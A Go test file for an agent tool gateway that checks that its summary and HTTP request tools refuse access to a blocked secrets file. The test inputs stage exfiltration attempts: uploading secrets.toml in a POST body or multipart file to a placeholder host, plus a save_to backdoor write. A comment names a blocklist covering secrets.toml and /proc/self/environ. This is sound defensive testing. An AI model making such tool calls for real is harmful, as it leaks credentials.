package tools

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"foci/internal/secrets"
)

// blockedSecretsFile returns a store with the default blocklist plus a real
// file named secrets.toml on disk that the blocklist rejects (by component-
// aligned suffix). Used to prove the in-process file tools refuse to touch a
// protected path — the P0-2 in-gateway exfiltration vector.
func blockedSecretsFile(t *testing.T) (*secrets.Store, string) {
	t.Helper()
	store, err := secrets.Load("/nonexistent") // default blocklist: secrets.toml, /proc/self/environ
	if err != nil {
		t.Fatalf("load store: %v", err)
	}
	path := filepath.Join(t.TempDir(), "secrets.toml")
	if err := os.WriteFile(path, []byte("api_key = \"sensitive\"\n"), 0600); err != nil {
		t.Fatalf("write secrets file: %v", err)
	}
	return store, path
}

// TestSummaryRejectsBlockedPath proves the summary tool refuses to read a
// blocked path. Without a secrets store wired in, summary used os.ReadFile
// directly inside foci-gw (full privilege) and would exfiltrate secrets.toml.
func TestSummaryRejectsBlockedPath(t *testing.T) {
	store, blocked := blockedSecretsFile(t)
	tool := NewSummaryTool(store, nil, "")

	params, _ := json.Marshal(map[string]any{"file": blocked, "prompt": "dump it"})
	_, err := tool.Execute(context.Background(), params)
	if err == nil {
		t.Fatal("expected summary on blocked path to be rejected")
	}
	if !strings.Contains(err.Error(), "restricted") {
		t.Errorf("expected access-denied error, got: %v", err)
	}
}

// TestHTTPBodyFileRejectsBlockedPath proves http_request refuses to read a
// blocked path as a request body (the foci_http_request --body-file
// secrets.toml exfiltration path).
func TestHTTPBodyFileRejectsBlockedPath(t *testing.T) {
	store, blocked := blockedSecretsFile(t)
	tool := NewHTTPRequestTool(store, nil, "", 0, 50*1024*1024, nil, 0640)

	params, _ := json.Marshal(map[string]any{
		"url":       "http://example.invalid/",
		"method":    "POST",
		"body_file": blocked,
	})
	_, err := tool.Execute(context.Background(), params)
	if err == nil || !strings.Contains(err.Error(), "restricted") {
		t.Fatalf("expected body_file on blocked path to be rejected, got: %v", err)
	}
}

// TestHTTPFilesRejectsBlockedPath proves http_request refuses to attach a
// blocked path as a multipart upload (the files[] bypass that skips secret
// scanning entirely).
func TestHTTPFilesRejectsBlockedPath(t *testing.T) {
	store, blocked := blockedSecretsFile(t)
	tool := NewHTTPRequestTool(store, nil, "", 0, 50*1024*1024, nil, 0640)

	params, _ := json.Marshal(map[string]any{
		"url":    "http://example.invalid/",
		"method": "POST",
		"files":  []map[string]any{{"field_name": "f", "file_path": blocked}},
	})
	_, err := tool.Execute(context.Background(), params)
	if err == nil || !strings.Contains(err.Error(), "restricted") {
		t.Fatalf("expected files[] on blocked path to be rejected, got: %v", err)
	}
}

// TestHTTPSaveToRejectsBlockedPath proves http_request refuses to write its
// response to a blocked path (the save_to backdoor-plant vector).
func TestHTTPSaveToRejectsBlockedPath(t *testing.T) {
	store, blocked := blockedSecretsFile(t)
	tool := NewHTTPRequestTool(store, nil, "", 0, 50*1024*1024, nil, 0640)

	params, _ := json.Marshal(map[string]any{
		"url":     "http://example.invalid/",
		"method":  "GET",
		"save_to": blocked,
	})
	_, err := tool.Execute(context.Background(), params)
	if err == nil || !strings.Contains(err.Error(), "restricted") {
		t.Fatalf("expected save_to on blocked path to be rejected, got: %v", err)
	}
}
